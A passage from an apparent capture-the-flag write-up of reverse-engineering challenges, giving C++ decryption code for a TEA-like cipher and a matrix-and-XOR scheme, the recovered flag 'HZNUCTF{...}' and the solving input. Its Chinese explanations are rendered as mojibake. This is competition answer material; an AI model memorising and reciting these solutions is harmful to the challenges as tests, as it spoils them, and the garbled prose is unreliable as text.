class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> *__fastcall <span class="title">dec</span><span class="params">(<span class="type">int</span> _a1_, <span class="type">unsigned</span> <span class="type">int</span> *_a2_, <span class="type">unsigned</span> <span class="type">int</span> *_a3_, <span class="type">unsigned</span> <span class="type">int</span> _a4_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v5;      <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6;      <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v7;      <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">    <span class="type">int</span> i;                <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">    v5 = *_a2_;</span><br><span class="line">    v6 = *_a3_;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v7 = -_a1_ * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v6 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">        v7 += _a1_;</span><br><span class="line">        v5 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * (v7 &amp; <span class="number">3</span>)) + v7) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">    &#125;</span><br><span class="line">    *_a2_ = v5;</span><br><span class="line">    result = _a3_;</span><br><span class="line">    *_a3_ = v6;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[] = &#123;</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0x8C</span>, <span class="number">0x1A</span>, <span class="number">0x74</span>, <span class="number">0xA7</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x8D</span>, <span class="number">0x67</span>, <span class="number">0x3C</span>, <span class="number">0xFB</span>, <span class="number">0x79</span>, <span class="number">0x3A</span>, <span class="number">0x08</span>, <span class="number">0xF6</span>,</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x24</span>, <span class="number">0xCC</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0x59</span>, <span class="number">0xFA</span>, <span class="number">0x39</span>,</span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0xAB</span>, <span class="number">0xF2</span>, <span class="number">0x72</span>, <span class="number">0x9F</span>, <span class="number">0x18</span>, <span class="number">0x17</span>&#125;;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x7e8</span>);</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        <span class="built_in">dec</span>(<span class="number">0x9E3779B9</span>, (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + (j - <span class="number">1</span>) * <span class="number">4</span>), (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + j * <span class="number">4</span>), (<span class="type">uint32_t</span>)key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å››ä¸ªå­—èŠ‚ä¸€ç»„è¿›è¡Œç¿»è½¬</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = *((<span class="type">char</span> *)buffer + j + <span class="number">3</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">2</span>) &lt;&lt; <span class="number">8</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">1</span>) &lt;&lt; <span class="number">16</span>) | (*((<span class="type">char</span> *)buffer + j) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        *(<span class="type">int</span> *)(buffer + j) = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p><h2 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h2><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯è¾“å…¥ 64 å­—èŠ‚å¤§å°çš„ 0101 äºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶åè¿›è¡Œè½¬æ¢åˆ° Hexï¼ˆå€’åºï¼‰ï¼Œå†å€’åºå›æ¥æ‹†åˆ†åŠä¸ªå­—èŠ‚è½¬åˆ° ascii å­—ç¬¦ã€‚</p><p>å¦‚ï¼š0101001001100101 ç¬¬ä¸€æ¬¡å‡½æ•°åæ˜¯ 0x65ï¼Œ0x52 ç„¶åå†ç¿»è½¬æ‹†åˆ†ä¸º ascii å­—ç¬¦â€™5â€™,â€™2â€™,â€™6â€™,â€™5â€™ã€‚</p><p><img src="/2025/04/13/TGCTF2025/TxRSbtlaOoGfE9xuGS8chr7snuc.png"></p><p>æ ¹æ®åˆ¤æ–­åˆ¤æ–­å‡ºçš„å­—ç¬¦å¯çŸ¥è¦è¾“å…¥çš„æ˜¯ 52 65 56 65 52 65 53 65 çš„äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p><code>0101001001100101010101100110010101010010011001010101001101100101</code></p><p>åº•ä¸‹çš„ä¸€äº›åŠ å¯†å‡½æ•°é‡Œé¢æœ‰èŠ±æŒ‡ä»¤ï¼Œæ˜¯åŸºç¡€èŠ±æŒ‡ä»¤ï¼Œè¿™è¾¹ä¸åšå¤šèµ˜è¿°ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†ç”¨å›ºå®šç§å­çš„éšæœºæ•°åˆå§‹åŒ–äº†ä¸€ä¸ª v18 æ•°å€¼åˆ—è¡¨ã€‚</p><p><img src="/2025/04/13/TGCTF2025/E57zbT7UAouWIoxT4qbcAgg8nLg.png"></p><p>ç„¶åè¿›è¡Œå››æ¬¡åŠ å¯†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/U8vVbo1XroTRa3x38f2cevkEndh.png"></p><p>Enc1 æ˜¯ç”¨éšæœºæ•°åˆå§‹åŒ–çš„åˆ—è¡¨è¿›è¡Œæ‰“ä¹±è¾“å…¥å­—ç¬¦ä¸²çš„é¡ºåºã€‚</p><p><img src="/2025/04/13/TGCTF2025/F2GsbyGsLoVzmTxG1zzcg2h0nlb.png"></p><p>Enc2 æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²è½¬å­˜åˆ°å¦ä¸€ä¸ªäºŒç»´æ•°ç»„ã€‚</p><p><img src="/2025/04/13/TGCTF2025/SSyIbLzGao8Nbmx7pcNckZyhnpd.png"></p><p>ç¬¬ä¸‰ä¸ªå‡½æ•°æ˜¯å°†ä¹‹å‰è¾“å…¥è½¬æ¢åçš„ Key å­˜åˆ°â€Strâ€ä¸­ï¼Œå®é™…å€¼å°±æ˜¯ <strong>ReVeReSe</strong></p><p>ç¬¬å››ä¸ªå‡½æ•°æ˜¯ç”¨ä¸€ä¸ªå…¨å±€çš„çŸ©é˜µä¹˜ä¸Šè¾“å…¥æ•°æ®ã€‚</p><p><img src="/2025/04/13/TGCTF2025/LZg4btpJ4odkaRxmWcrco0OTngf.png"></p><p>æœ€åå’Œ Key è¿›è¡Œå¾ªç¯å¼‚æˆ–åŠ å¯†ã€‚</p><p><img src="/2025/04/13/TGCTF2025/JLNAbr3vIo0mX6xHpmZct8gmnth.png"></p><p>æ‰€ä»¥è§£å¯†æµç¨‹å°±æ˜¯è¿™å‡ æ­¥çš„ç¿»è½¬ï¼Œéœ€è¦å…ˆè®¡ç®—å‡ºå…¨å±€çŸ©é˜µæ•°æ®çš„é€†çŸ©é˜µï¼Œè¿™ä¸€æ­¥ç”¨åœ¨çº¿ç½‘ç«™å°±å¯ä»¥è§£å¾—ã€‚</p><p>Enc1 ç”±äºæ˜¯å¯¹ç§°çš„å¯ä»¥ç›´æ¥ç”¨åŸå‡½æ•°ï¼ŒEnc3 ä¹Ÿå¯ä»¥ç›´æ¥ç”¨åŸå‡½æ•°æŠŠçŸ©é˜µæ•°æ®æ”¹æˆé€†çŸ©é˜µå°±æ˜¯è§£å¯†ã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc1</span><span class="params">(<span class="type">char</span> *_Str_, <span class="type">int</span> *_RdList_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> v3;   <span class="comment">// [esp+D3h] [ebp-1Dh]</span></span><br><span class="line">    <span class="type">size_t</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> result = v5 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= v5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (_RdList_[i] &gt;= <span class="number">0</span> &amp;&amp; _RdList_[i] &lt; v5)</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = _Str_[i];</span><br><span class="line">            _Str_[i] = _Str_[v5 - _RdList_[i] - <span class="number">1</span>];</span><br><span class="line">            _Str_[v5 - _RdList_[i] - <span class="number">1</span>] = v3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;  <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            *&amp;_a1_[<span class="number">32</span> * i + <span class="number">4</span> * j] = _a2_[v4++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_3FC368[] = &#123;</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> inv[] = &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">3</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-3</span>,<span class="number">1</span>,<span class="number">-2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Enc3</span><span class="params">(<span class="type">int</span> *_a1_, <span class="type">char</span> *_a2_, <span class="type">char</span> *_a3_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> k;      <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> j;      <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> i;      <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k)</span><br><span class="line">                _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] += *&amp;_a2_[<span class="number">32</span> * k + <span class="number">4</span> * j] * _a1_[<span class="number">8</span> * i + k];</span><br><span class="line">        &#125;</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> v4;</span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            _a2_[v4++] = _a1_[<span class="number">32</span> * i + <span class="number">4</span> * j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// First: 